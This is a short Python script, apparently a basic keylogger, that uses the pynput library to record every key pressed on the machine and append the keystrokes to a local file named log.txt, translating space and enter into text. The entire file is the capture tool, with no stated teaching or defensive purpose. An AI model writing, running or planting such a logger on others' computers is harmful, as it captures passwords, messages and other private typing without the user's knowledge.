from pynput.keyboard import Listener


def wtf(key):
    let = str(key)
    let = let.replace("'", "")

    if let == 'Key.space':
        let = ' '
    if let == 'Key.shift_r':
        let = ''
    if let == "Key.ctrl_l":
        let = ""
    if let == "Key.enter":
        let = "\n"

    with open("log.txt", 'a') as f:
        f.write(let)


with Listener(on_press=wtf) as l:
    l.join()
